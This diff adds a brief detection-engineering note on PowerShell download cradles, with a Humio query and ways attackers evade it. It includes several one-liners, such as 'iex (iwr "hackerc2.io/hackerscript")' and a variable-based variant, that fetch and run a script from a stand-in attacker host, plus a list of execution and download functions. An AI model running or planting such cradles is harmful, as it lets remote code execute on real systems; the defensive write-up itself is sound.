@@ -1,0 +1,48 @@
+Powershell cradles are a combination of a web-request command and an execution command. They are used in multiple malicious files and have been known to bypass EDR solutions and custom detections will need to be
+created on top of an EDR solution. 
+
+Example
+
+invoke-expression(invoke-webrequest "hackerc2.io/hackerscript")
+
+A basic humio detection
+
+"""
+#event_simpleName=/^(CommandHistory|ProcessRollub2)$/ event_platform=Win
+| case{
+    #event_simpleName=CommandHistory
+    | CommandHistory=/(Invoke-Expression.*Invoke-WebRequest)/i
+}
+
+Detecting by these strings only will allow attackers to remain undetected if they use different iterations of the powershell cradle.
+
+Examples
+
+iex (iwr "hackerc2.io/hackerscript")
+invoke-expression( iwr "hackerc2.io/hackerscript")
+
+There are multiple functions for execution and web request and are not limited to these
+Examples
+iex
+invoke-expression
+Start-Process
+
+Examples
+iwr
+invoke-webrequest
+DownLoadstring
+
+Detection must be able to include the multiple combinations. It is easy to do if a lookup table that is referencing one or the other. Also the order of functions must be accounted for. 
+
+"""
+|CommandHistory=/(Invoke-Expression.*Invoke-WebRequest)/i
+"""
+
+This detection is evaded if a variable is used to put the web request function before the execution. 
+
+Example:
+
+$request = invoke-webrequest "hackerc2.io/hackerscript"
+iex $request
+
+In summary, detection should account for all variations of execution and downloads in any order. This type of alert does not account for obfuscation and it is easier to create a second custom detection.
